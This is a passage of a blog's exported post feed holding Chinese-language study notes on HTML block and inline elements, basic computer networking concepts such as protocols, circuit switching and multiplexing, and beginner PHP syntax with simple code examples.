src="https://pic1.imgdb.cn/item/67d2f41a88c538a9b5bc8c64.png" alt=""></p><h2 id="块元素和行内元素（内联元素）"><a href="#块元素和行内元素（内联元素）" class="headerlink" title="块元素和行内元素（内联元素）"></a>块元素和行内元素（内联元素）</h2><p>内联元素和块元素的区别：</p><div class="table-container"><table><thead><tr><th style="text-align:center">块级元素</th><th style="text-align:center">内联元素</th></tr></thead><tbody><tr><td style="text-align:center">块元素会在页面独占一行（自上而下垂直排列）</td><td style="text-align:center">行内元素不会独占页面的一行，只占自身的大小</td></tr><tr><td style="text-align:center">可以设置width，height属性</td><td style="text-align:center">行内元素设置width，height属性无效</td></tr><tr><td style="text-align:center">一般块级元素可以包含行内元素和其他块级元素</td><td style="text-align:center">一般内联元素包含内联元素不包含块级元素</td></tr></tbody></table></div><p><strong>常见块级元素：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div,form,h1-h6,hr,p,table,ul等</span><br></pre></td></tr></table></figure><p><strong>常见内联元素：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,b,em,i,span,strong等</span><br></pre></td></tr></table></figure><p><strong>行内块级元素（特点：不换行，能够识别宽高）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">button,img,input等</span><br></pre></td></tr></table></figure><h2 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h2><p><strong>div:</strong> 容器标签</p><p><strong>H5新标签：</strong></p><p><code>&lt;header&gt;&lt;/header&gt;</code>：头部</p><p><code>&lt;nav&gt;&lt;/nav&gt;</code>：导航</p><p><code>&lt;section&gt;&lt;/section&gt;</code>：定义文档中的节，比如章节，页眉，页脚</p><p><code>&lt;aside&gt;&lt;/aside&gt;</code>侧边栏</p><p><code>&lt;footer&gt;&lt;/footer&gt;</code>脚部</p><p><code>&lt;article&gt;&lt;/article&gt;</code>代表一个独立的，完整的相关内容块。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-学习笔记【1】</title>
      <link href="/2025/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>【目标：了解基础的网络协议，OSI模型，http协议，dns，ip地址，端口，cookie等概念，明白各个设备是怎么建立连接并进行通信】</p><p>（由于本篇学习内容较多，文章大约一周更新一次，在已有内容之下补充新的学习笔记）</p><h1 id="计算机网络-学习笔记"><a href="#计算机网络-学习笔记" class="headerlink" title="计算机网络-学习笔记"></a>计算机网络-学习笔记</h1><p><em><code>通信技术</code>与<code>计算机技术</code>紧密结合的产物</em>，<em>计算机网络就是一种 <code>通信网络</code></em></p><h2 id="lv1-什么是计算机网络？"><a href="#lv1-什么是计算机网络？" class="headerlink" title="lv1_什么是计算机网络？"></a>lv1_什么是计算机网络？</h2><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>​        计算机网络就是<code>互连</code>的，<code>自治</code>的计算机集合</p><p>​        自治——无主从关系</p><p>​        互连——互联互通</p><h3 id="交换网络："><a href="#交换网络：" class="headerlink" title="交换网络："></a>交换网络：</h3><p>通过交换网络连接主机，交换节点：路由器或交换机</p><h3 id="Internet："><a href="#Internet：" class="headerlink" title="Internet："></a>Internet：</h3><ol><li><p>全球最大的互联网络，ISP(Internet Service Provider）网络互连的“网络之网络”</p></li><li><p>数以百万计的互连的计算设备集合（通过通信链路联系在一起）</p></li><li><p>为网络应用提供通信服务的通信基础设施（Web，VoIP，Email，网络游戏，电子商务，社交网络）</p></li><li><p>为网络应用提供应用编程接口（API）：支持应用程序连接Internet，发送/接收数据，提供类似于邮政系统的数据传输服务。</p></li></ol><h2 id="lv2-网络协议"><a href="#lv2-网络协议" class="headerlink" title="lv2_网络协议"></a>lv2_网络协议</h2><p><em>仅有硬件（主机，链路，路由器……）连接，Internet不能顺畅运行，不能保证应用数据有序交付，还需要<code>协议</code></em></p><h3 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h3><p>计算机网络中的数据交换必须遵守事先约定好的规则（任何通信或信息交换过程都需要规则）</p><ol><li><p><code>网络协议</code>，简称为协议，是为进行网络中的数据交换而建立的规则，标准或约定。</p></li><li><p>协议规定了通信实体之间所交换的消息的格式，意义，顺序以及针对收到信息或发生的事件所采取的“动作“</p></li><li><p><code>协议的三要素：</code></p><p>（1）语法：数据与控制信息的结构或格式，信号电平</p><p>（2）语义：需要发出何种控制信息，完成何种动作以及做出何种响应，差错控制</p><p>（3）时序：事件顺序，速度匹配</p><p>协议规范了网络中所有信息发送和接收过程（TCP，IP，HTTP，Skype，802.11）</p></li></ol><h2 id="lv3-计算机网络结构"><a href="#lv3-计算机网络结构" class="headerlink" title="lv3_计算机网络结构"></a>lv3_计算机网络结构</h2><ol><li>网络边缘：主机，网络应用</li><li>接入网络（物理介质）：有线或无线通信链路</li><li>网络核心（核心网络）：互联的路由器（或分组转发设备）</li></ol><h3 id="网络边缘："><a href="#网络边缘：" class="headerlink" title="网络边缘："></a><strong>网络边缘：</strong></h3><ol><li><p>主机（端系统）：</p><p>位于”网络边缘“</p><p>运行网络应用程序（Web,email）</p><ol><li><p>客户/服务器（client/server）应用模型：</p><p>客户发送请求，接收服务器响应（Web应用，文件传输FTP应用）</p></li></ol></li><li><p>对等（peer-peer,P2P）应用模型：</p><p>无（或不依赖）专用服务器</p><p>通信在对等实体之间直接进行</p></li></ol><h3 id="接入网络："><a href="#接入网络：" class="headerlink" title="接入网络："></a><strong>接入网络：</strong></h3><p><em>将网络边缘接入核心网（边缘路由器）</em></p><p>例：</p><ol><li>住宅（家庭）接入网络</li><li>机构接入网络（学校，企业等）</li><li>移动接入网络</li></ol><p>用户关心的是：</p><ol><li>带宽（bandwidth）（bps）</li><li>共享/独占？</li></ol><p>​        <strong>接入网络：数字用户线路（DSL）</strong></p><p><img src="https://pic1.imgdb.cn/item/67c28ce1d0e0a243d4089ae5.png" style="zoom:50%;" /></p><p>​        <strong>接入网络：电缆网络</strong></p><p><img src="https://pic1.imgdb.cn/item/67c28d5ed0e0a243d4089c8b.png" style="zoom:50%;" /></p><p>​        <strong>家庭接入网络</strong></p><p><img src="https://pic1.imgdb.cn/item/67c28de8d0e0a243d4089e57.png" style="zoom:50%;" /></p><p>​        <strong>机构（企业）接入网络</strong></p><p><img src="https://pic1.imgdb.cn/item/67c28e29d0e0a243d4089f09.png" style="zoom:50%;" /></p><p>​        <strong>无线接入网络</strong></p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250301123440690.png" alt="image-20250301123440690" style="zoom:50%;" /></p><h3 id="网络核心："><a href="#网络核心：" class="headerlink" title="网络核心："></a><strong>网络核心：</strong></h3><p><em>互联的路由器网络</em></p><p>网络核心的关键功能：<code>路由</code>+<code>转发</code></p><p><code>路由</code>：确定分组从源到目的地的传输路径</p><p><code>转发</code>：将分组从路由器的输入端口交换至正确的输出端口</p><p>网络核心解决的基本问题：如何实现数据从源主机通过网络核心送达目的主机？</p><h2 id="lv4-Internet结构"><a href="#lv4-Internet结构" class="headerlink" title="lv4_Internet结构"></a>lv4_Internet结构</h2><p><em>网络之网络</em></p><ol><li><p>端系统通过接入ISP连接到Internet</p><p>家庭，公司和大学ISPs</p></li><li><p>接入ISP必须进一步互连</p><p>这样任意两个主机才可以互相发送分组</p></li><li><p>构成复杂的网络互连的网络</p><p>经济和国家政策是网络演进的主要驱动力</p></li><li><p>当前Internet结构</p><p>无人能给出精确描述</p></li></ol><p><img src="https://pic1.imgdb.cn/item/67c29193d0e0a243d408a386.png" style="zoom:50%;" /></p><h2 id="lv5-电路交换"><a href="#lv5-电路交换" class="headerlink" title="lv5_电路交换"></a>lv5_电路交换</h2><h3 id="数据交换："><a href="#数据交换：" class="headerlink" title="数据交换："></a>数据交换：</h3><p><em>（实现数据通过网络核心从源主机到达目的主机）</em></p><p><img src="https://pic1.imgdb.cn/item/67c29510d0e0a243d408a3f0.png" style="zoom:50%;" /></p><p><strong>数据交换的类型：</strong>电路交换，报文交换，分组交换</p><h3 id="电路交换："><a href="#电路交换：" class="headerlink" title="电路交换："></a>电路交换：</h3><p>最典型电路交换网络：<strong>电话网络</strong></p><p>电路交换的三个阶段：</p><ol><li>建立连接（呼叫/电路建立）</li><li>通信</li><li>释放连接</li></ol><p>特点：<code>独占资源</code>——两个电话之间在通话过程中建立起的电路所占有的通话资源不能被第三方占有！</p><p><img src="https://pic1.imgdb.cn/item/67c29528d0e0a243d408a3f9.png" style="zoom:50%;" /></p><h2 id="lv6-多路复用技术"><a href="#lv6-多路复用技术" class="headerlink" title="lv6_多路复用技术"></a>lv6_多路复用技术</h2><span class='nota' data-nota='这部分学不懂'>简单做点笔记</span><p>电路交换网络如何共享中继线？——多路复用（Multiplexing）</p><p><img src="https://pic1.imgdb.cn/item/67c294e2d0e0a243d408a3e4.png" style="zoom:50%;" /></p><p><code>多路复用</code>,简称复用，是通信技术中的基本概念。</p><p><img src="https://pic1.imgdb.cn/item/67c3ef4ed0e0a243d409a251.png" style="zoom: 67%;" /></p><p>多路复用：链路/网络资源（如带宽）划分为“资源片”</p><ol><li>将资源片分配给各路“呼叫”</li><li>每路呼叫独占分配到的资源片进行通信</li><li>资源片可能“闲置”</li></ol><p>典型多路复用方法：</p><ol><li>频分多路复用（FDM）</li><li>时分多路复用（TDM）</li><li>波分多路复用（WDM）</li><li>码分多路复用（CDM）</li></ol><h3 id="频分多路复用（FDM）"><a href="#频分多路复用（FDM）" class="headerlink" title="频分多路复用（FDM）"></a>频分多路复用（FDM）</h3><p><img src="https://pic1.imgdb.cn/item/67c3f074d0e0a243d409a580.png" style="zoom:50%;" /></p><p>频分多路复用的各用户占用不同的带宽资源（这里的带宽是频率带宽单位Hz，而不是数据的发送速率）</p><p>用户在分配到一定的频带后，在通信过程中自始至终占用这个频带。</p><h3 id="时分多路复用（TDM）"><a href="#时分多路复用（TDM）" class="headerlink" title="时分多路复用（TDM）"></a>时分多路复用（TDM）</h3><p>时分多路复用则是将时间划分为一段段等长的时分复用帧（TDM帧），每个用户在每个TDM帧中占用固定序号的时隙</p><p>每用户所占用的时隙是周期性出现（其周期就是TDM帧的长度）</p><p><img src="https://pic1.imgdb.cn/item/67c3f45cd0e0a243d409aade.png" alt=""></p><p>时分复用的所有用户是在不同的时间占用相同的频率宽度</p><p><img src="https://pic1.imgdb.cn/item/67c3f4c7d0e0a243d409aba1.png" alt=""></p><h3 id="波分多路复用（WDM）"><a href="#波分多路复用（WDM）" class="headerlink" title="波分多路复用（WDM）"></a>波分多路复用（WDM）</h3><p>波分复用就是光的频分复用</p><p><img src="https://pic1.imgdb.cn/item/67c3f60ad0e0a243d409afbe.png" style="zoom:50%;" /></p><p><img src="https://pic1.imgdb.cn/item/67c3f625d0e0a243d409afc2.png" style="zoom:50%;" /></p><h3 id="码分多路复用（CDM）"><a href="#码分多路复用（CDM）" class="headerlink" title="码分多路复用（CDM）"></a>码分多路复用（CDM）</h3><ol><li><p>广泛用于无线链路共享（蜂窝网，卫星通信等）</p></li><li><p>每个用户分配一个唯一的m bit码片序列，其中“0”用“-1”表示，“1”用“+1”表示</p></li><li><p>各用户使用相同频率载波，利用各码片序列编码数据</p></li><li><p>编码信号=（原始数据）×（码片序列）</p><p><img src="https://pic1.imgdb.cn/item/67c3f735d0e0a243d409b242.png" style="zoom:50%;" /></p></li></ol><ol><li><p>各用户码片序列相互<code>正交</code>:</p><p><img src="https://pic1.imgdb.cn/item/67c3f775d0e0a243d409b2e3.png" alt=""></p></li></ol><hr><p><img src="https://pic1.imgdb.cn/item/67c3fb78d0e0a243d409bba0.png" style="zoom:50%;" /></p><hr><p><img src="https://pic1.imgdb.cn/item/67c3fbb6d0e0a243d409bc52.png" style="zoom:50%;" /></p><hr><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250302143410644.png" alt="image-20250302143410644" style="zoom:50%;" /></p><hr><h2 id="lv7-报文交换与分组交换"><a href="#lv7-报文交换与分组交换" class="headerlink" title="lv7_报文交换与分组交换"></a>lv7_报文交换与分组交换</h2><p><strong>报文：</strong>源（应用）发送信息整体（比如一个文件）</p><p><strong>分组：</strong>报文分拆出来的一系列相对较小的数据包</p><pre><code>1. 分组交换需要报文的拆分与重组1. 产生额外开销</code></pre><p>分组交换与报文交换均采用<code>存储-转发</code>交换方式，区别：</p><ol><li>报文交换以完整报文进行“存储-转发”</li><li>分组交换以较小的分组进行“存储-转发”</li></ol><hr><h3 id="分组交换：统计多路复用"><a href="#分组交换：统计多路复用" class="headerlink" title="分组交换：统计多路复用"></a>分组交换：统计多路复用</h3><p><img src="https://pic1.imgdb.cn/item/67db721b88c538a9b5c15d2e.png" alt=""></p><h3 id="分组交换：传输延迟"><a href="#分组交换：传输延迟" class="headerlink" title="分组交换：传输延迟"></a>分组交换：传输延迟</h3><p>发送主机：</p><ol><li>接收应用报文（消息）</li><li>拆分为较小长度为L bits的分组（packets）</li><li>在传输速率为R的链路上传输分组</li></ol><p><img src="https://pic1.imgdb.cn/item/67c3fefbd0e0a243d409c519.png" style="zoom:50%;" /></p><hr><h3 id="存储-转发"><a href="#存储-转发" class="headerlink" title="存储-转发"></a>存储-转发</h3><p><img src="https://pic1.imgdb.cn/item/67db729688c538a9b5c15d73.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页后端学习笔记</title>
      <link href="/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="后端学习笔记"><a href="#后端学习笔记" class="headerlink" title="后端学习笔记"></a>后端学习笔记</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><strong>PHP</strong>即“超文本预处理器”，是一种通用开源脚本语言。PHP是在服务器端执行的脚本语言，与C语言类似，是常用的网站开发语言。主要适用于Web开发领域。</p><p><strong>PHP是一门弱类型语言：</strong>不必向PHP声明该变量的数据类型，PHP会根据变量的值，自动把变量转为正确的数据类型</p><h4 id="基础语法："><a href="#基础语法：" class="headerlink" title="基础语法："></a>基础语法：</h4><hr><ol><li><p>PHP脚本可以放在文档中的任何位置。PHP脚本以<code>&lt;?PHP</code>开始，以<code>?&gt;</code>结束。</p></li><li><p>PHP文件的默认文件扩展名为.php</p></li><li><p>PHP文件通常包含HTML标签和一些PHP代码</p></li></ol><p><strong>输出hello world：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;hello,world&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h4><hr><p><strong>单行注释：</strong>//</p><p><strong>多行注释：</strong>/**/</p><h4 id="变量："><a href="#变量：" class="headerlink" title="变量："></a>变量：</h4><hr><p>变量以“$”符号开始，后面跟着变量的名称，变量名必须以字母或者下划线开始，变量名只能包含字母，数字，下划线。</p><p>变量名是区分大小写的！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3b70488c538a9b5bceef9.png" alt=""></p><h4 id="外部变量："><a href="#外部变量：" class="headerlink" title="外部变量："></a>外部变量：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__); <span class="comment">//将php代码显示在网页上</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]; <span class="comment">//通过POST方法提交数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$passwd</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3bc1988c538a9b5bcf0a3.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67d3bc8688c538a9b5bcf0b5.png" alt=""></p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>程序中的数据种类繁多，可以根据类型不同，分为几大类：</p><pre><code>String（字符串）Integer（整型）Float（浮点型）Boolean（布尔型）Array（数组）Object（对象）NULL（空值）Resour</code></pre><ol><li><strong>字符串</strong></li></ol><p>一个字符串是一串字符的序列，就像 “Hello world!”。</p><p>可以将任何文本放在单引号和双引号中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><strong>整数</strong></li></ol><p>整数是一个没有小数的数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">1359</span>;</span><br><span class="line">    <span class="variable">$x</span> = -<span class="number">345</span>; <span class="comment">// 负数 </span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">047</span>; <span class="comment">// 八进制数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><strong>小数（浮点数）</strong></li></ol><p>浮点数是带小数部分的数字，或是指数形式。</p><p>var_dump() 函数返回变量的数据类型和值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">10.365</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">2.4e3</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>布尔</strong></li></ol><p>布尔型可以是 TRUE 或 FALSE，TRUE标识真，FALSE标识假。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>PHP 对象 (Object)</strong></li></ol><p>对象类型可以用于存储数据，使用class关键字声明类对象，类包含属性和方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//类名</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">      <span class="comment">//属性</span></span><br><span class="line">      <span class="keyword">var</span> <span class="variable">$color</span>;</span><br><span class="line">      <span class="comment">//方法</span></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;方法1&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><strong>null值</strong></li></ol><p>NULL 值表示变量没有值，NULL 是数据类型为 NULL 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组:"></a>数组:</h4><p>数组指数据的组合，能够在单个变量中存储多个值。</p><p>可以将数组看作一个存储数据的盒子，盒子中有很多个格子，每个格子中都可存储一个数据。</p><p>数组名：盒子名</p><p>元素：格子中的数据</p><p>索引：格子的位置</p><p>长度：格子的数量</p><ol><li>创建数组并读取数据</li></ol><p>通过索引读取数组中的元素 ：$数组名[索引];</p><p>索引从0开始。即数组中的第一个元素索引为0，以此类推。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过索引 读取数组中的所有元素  $数组名[索引];</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$cars</span>[0].<span class="subst">$cars</span>[1].<span class="subst">$cars</span>[2]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>获取数组长度</li></ol><p>count() 函数用于返回数组的长度。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>遍历数组</li></ol><p>遍历指的是读取数组中的所有数据，使用 for 循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line">    <span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PHP流程控制语句"><a href="#PHP流程控制语句" class="headerlink" title="PHP流程控制语句"></a>PHP流程控制语句</h4><p><strong>if条件控制语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(判断语句<span class="number">1</span>)&#123;</span><br><span class="line">   执行语句体<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>（判断语句<span class="number">2</span>）&#123;</span><br><span class="line">   执行语句体<span class="number">2</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>（判断语句n）&#123;</span><br><span class="line">   执行语句体n</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   最后的<span class="keyword">else</span>语句可选</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>while循环语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span> ;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>for循环语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 